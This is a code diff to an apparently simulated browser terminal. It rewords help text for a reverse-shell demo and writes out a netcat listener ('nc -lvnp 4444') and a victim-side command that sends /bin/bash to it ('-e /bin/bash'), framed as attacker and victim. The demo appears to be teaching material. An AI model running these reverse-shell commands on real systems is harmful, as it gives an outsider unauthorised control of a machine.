@@ -41,8 +41,8 @@ Try:  ls -la      ·   cat readme.md      ·   grep -i error /var/log/syslog
       nmap 10.0.0.5      ·   ping -c 3 google.com      ·   sudo apt update
       chmod +x scripts/hello.sh && ./scripts/hello.sh
 
-Reverse-shell demo — open a second terminal (the two-panes button in the header), then:
-      Tab A:  nc -lvnp 4444            Tab B:  nc <tabA-ip> 4444 -e /bin/bash
+Reverse-shell demo — click Split in the header for two terminals (A on top, B below):
+      Machine A:  nc -lvnp 4444        Machine B:  nc <machineA-ip> 4444 -e /bin/bash
   * full-screen editors (nano/vi) show a redirection tip instead.
 `;
 
@@ -784,10 +784,10 @@ function ncRun(args: string[], io: IO): number {
       '  -l  listen for an incoming connection\n' +
       '  -v  verbose      -n  numeric only      -p  local port\n' +
       '  -e  program to run after connect (bind / reverse shell)\n\n' +
-      'Try it across two terminal tabs:\n' +
-      '  Tab A (attacker):  nc -lvnp 4444\n' +
-      '  Tab B (victim):    nc <attacker-ip> 4444 -e /bin/bash\n' +
-      "  Then type commands in Tab A — you're driving Tab B's shell.\n");
+      'Click Split in the header, then across the two panes:\n' +
+      '  Machine A (attacker):  nc -lvnp 4444\n' +
+      '  Machine B (victim):    nc <machineA-ip> 4444 -e /bin/bash\n' +
+      "  Then type commands in A — you're driving B's shell.\n");
     return 0;
   }
   const flags = args.filter((a) => a.startsWith('-') && !/^-\d+$/.test(a));
